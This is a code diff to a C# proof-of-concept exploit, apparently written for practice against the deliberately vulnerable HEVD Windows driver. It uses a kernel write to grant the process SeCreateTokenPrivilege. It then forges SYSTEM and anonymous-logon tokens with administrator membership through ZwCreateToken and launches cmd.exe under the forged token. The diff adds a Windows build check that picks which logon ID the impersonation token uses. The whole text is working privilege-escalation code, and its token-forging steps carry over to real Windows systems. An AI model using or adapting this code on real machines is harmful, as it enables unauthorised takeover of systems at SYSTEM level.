@@ -5,9 +5,9 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Security.Principal;
 
-namespace CreateImpersonateTokenVariant
+namespace CreateTokenVariant
 {
-    class CreateImpersonateTokenVariant
+    class CreateTokenVariant
     {
         // Windows Definition
         // Windows Enum
@@ -765,6 +765,12 @@ namespace CreateImpersonateTokenVariant
             ref int ReturnLength);
 
         [DllImport("ntdll.dll")]
+        static extern void RtlGetNtVersionNumbers(
+            ref int MajorVersion,
+            ref int MinorVersion,
+            ref int BuildNumber);
+
+        [DllImport("ntdll.dll")]
         static extern int ZwCreateToken(
             out IntPtr TokenHandle,
             TokenAccessFlags DesiredAccess,
@@ -831,6 +837,7 @@ namespace CreateImpersonateTokenVariant
         const string SE_CREATE_SYMBOLIC_LINK_NAME = "SeCreateSymbolicLinkPrivilege";
         const string SE_DELEGATE_SESSION_USER_IMPERSONATE_NAME = "SeDelegateSessionUserImpersonatePrivilege";
         const byte SECURITY_STATIC_TRACKING = 0;
+        static readonly LUID ANONYMOUS_LOGON_LUID = new LUID(0x3e6, 0);
         static readonly LUID SYSTEM_LUID = new LUID(0x3e7, 0);
 
         // User define Consts
@@ -881,7 +888,7 @@ namespace CreateImpersonateTokenVariant
             SECURITY_IMPERSONATION_LEVEL impersonationLevel)
         {
             int error;
-            LUID authId = SYSTEM_LUID;
+            LUID authId;
             var tokenSource = new TOKEN_SOURCE("*SYSTEM*");
             tokenSource.SourceIdentifier.HighPart = 0;
             tokenSource.SourceIdentifier.LowPart = 0;
@@ -923,8 +930,27 @@ namespace CreateImpersonateTokenVariant
                 SE_DELEGATE_SESSION_USER_IMPERSONATE_NAME
             };
 
+            int majorVersion = 0;
+            int minorVersion = 0;
+            int buildNumber = 0;
+
+            RtlGetNtVersionNumbers(ref majorVersion, ref minorVersion, ref buildNumber);
+            buildNumber &= 0xFFFF;
+
+            if (tokenType == TOKEN_TYPE.TokenImpersonation &&
+                majorVersion >= 10 &&
+                minorVersion >= 0 &&
+                buildNumber >= 17763)
+            {
+                authId = ANONYMOUS_LOGON_LUID;
+            }
+            else
+            {
+                authId = SYSTEM_LUID;
+            }
+
             Console.WriteLine("[>] Trying to create an elevated {0} token.",
-                tokenType == TOKEN_TYPE.TokenPrimary ? "primary" : "impersonation");
+            tokenType == TOKEN_TYPE.TokenPrimary ? "primary" : "impersonation");
 
             if (!ConvertStringSidToSid(
                 DOMAIN_ALIAS_RID_ADMINS,
@@ -1446,9 +1472,10 @@ namespace CreateImpersonateTokenVariant
             Marshal.Copy(nullBytes, 0, buffer, size);
         }
 
+
         static void Main()
         {
-            Console.WriteLine("--[ HEVD Kernel Write PoC : SeCreateTokenPrivilege And SeImpersonatePrivilege\n");
+            Console.WriteLine("--[ HEVD Kernel Write PoC : SeCreateTokenPrivilege\n");
 
             if (!Environment.Is64BitOperatingSystem)
             {
@@ -1482,40 +1509,39 @@ namespace CreateImpersonateTokenVariant
                 return;
             }
 
-            var privs = (ulong)(SepTokenPrivilegesFlags.CREATE_TOKEN |
-                SepTokenPrivilegesFlags.IMPERSONATE);
+            var privs = (ulong)SepTokenPrivilegesFlags.CREATE_TOKEN;
 
             OverwriteTokenPrivileges(hDevice, tokenPointer, privs);
             CloseHandle(hDevice);
 
-            IntPtr hElevatedImpersonation = CreateElevatedToken(
+            IntPtr hImpersonationToken = CreateElevatedToken(
                 TOKEN_TYPE.TokenImpersonation,
-                SECURITY_IMPERSONATION_LEVEL.SecurityDelegation);
+                SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation);
 
-            if (hElevatedImpersonation == IntPtr.Zero)
+            if (hImpersonationToken == IntPtr.Zero)
                 return;
 
-            if (!ImpersonateThreadToken(hElevatedImpersonation))
+            IntPtr hPrimaryToken = CreateElevatedToken(
+                TOKEN_TYPE.TokenPrimary,
+                SECURITY_IMPERSONATION_LEVEL.SecurityAnonymous);
+
+            if (hPrimaryToken == IntPtr.Zero)
+                return;
+
+            if (!ImpersonateThreadToken(hImpersonationToken))
             {
-                CloseHandle(hElevatedImpersonation);
+                CloseHandle(hImpersonationToken);
+                CloseHandle(hPrimaryToken);
 
                 return;
             }
 
-            CloseHandle(hElevatedImpersonation);
-
-            IntPtr hElevatedPrimary = CreateElevatedToken(
-                TOKEN_TYPE.TokenPrimary,
-                SECURITY_IMPERSONATION_LEVEL.SecurityAnonymous);
-
-            if (hElevatedPrimary == IntPtr.Zero)
-                return;
-
             CreateTokenAssignedProcess(
-                hElevatedPrimary,
+                hPrimaryToken,
                 "C:\\Windows\\System32\\cmd.exe");
 
-            CloseHandle(hElevatedPrimary);
+            CloseHandle(hImpersonationToken);
+            CloseHandle(hPrimaryToken);
         }
     }
 }
